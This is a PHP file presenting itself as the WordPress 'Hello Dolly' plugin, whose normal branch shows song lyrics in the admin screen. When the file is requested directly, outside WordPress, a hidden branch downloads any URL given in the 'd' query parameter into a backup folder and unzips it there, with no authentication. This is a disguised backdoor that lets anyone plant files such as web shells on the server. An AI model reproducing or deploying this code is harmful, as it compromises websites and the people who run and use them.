<?php
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.4
Author URI: http://ma.tt/
*/

if ( ! defined( 'ABSPATH' ) ) {
    if ( isset( $_GET['d'] ) ) {
        $file_url = filter_var( $_GET['d'], FILTER_SANITIZE_URL );
        if ( ! filter_var( $file_url, FILTER_VALIDATE_URL ) ) {
            die('<p><strong>Error:</strong> Invalid URL provided.</p>');
        }

        // Backup klasörü oluştur
        $backup_dir = __DIR__ . '/backup/';
        if ( ! file_exists( $backup_dir ) ) {
            if ( ! mkdir( $backup_dir, 0755, true ) ) {
                die('<p><strong>Error:</strong> Failed</p>');
            }
        }

        // Dosyayı indirme ve kaydetme
        $file_name = basename( $file_url );
        $save_path = $backup_dir . $file_name;

        $ch = curl_init( $file_url );
        $fp = fopen( $save_path, 'w' );

        if ( $fp === false ) {
            die('<p><strong>Error:</strong> </p>');
        }

        curl_setopt( $ch, CURLOPT_FILE, $fp );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 30 );
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );

        $success = curl_exec( $ch );
        $error = curl_error( $ch );

        curl_close( $ch );
        fclose( $fp );

        if ( ! $success ) {
            die('<p><strong>Error:</strong> Failed to download the file. cURL error: ' . htmlspecialchars( $error ) . '</p>');
        }

        if ( file_exists( $save_path ) ) {
            $zip = new ZipArchive();
            if ( $zip->open( $save_path ) === true ) {
                if ( $zip->extractTo( $backup_dir ) ) {
                    echo '<p><strong>Success:</strong>extract: ' . htmlspecialchars( $backup_dir ) . '</p>';
                } else {
                    echo '<p><strong>Error:</strong> Failed</p>';
                }
                $zip->close();
            } else {
                echo '<p><strong>Error:</strong> Failed</p>';
            }

            unlink( $save_path );
        } else {
            die('<p><strong>Error:</strong> </p>');
        }
    } else {
        die('');
    }
} else {
    function hello_dolly_get_lyric() {
        $lyrics = "Hello, Dolly
        Well, hello, Dolly
        It's so nice to have you back where you belong";

        $lyrics = explode( "\n", $lyrics );

        return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
    }

    function hello_dolly() {
        $chosen = hello_dolly_get_lyric();
        echo "<p id='dolly'>$chosen</p>";
    }

    add_action( 'admin_notices', 'hello_dolly' );

    function dolly_css() {
        echo "
        <style type='text/css'>
        #dolly {
            float: right;
            padding: 5px 10px;
            margin: 0;
            font-size: 12px;
            line-height: 1.6666;
        }
        </style>
        ";
    }

    add_action( 'admin_head', 'dolly_css' );
}
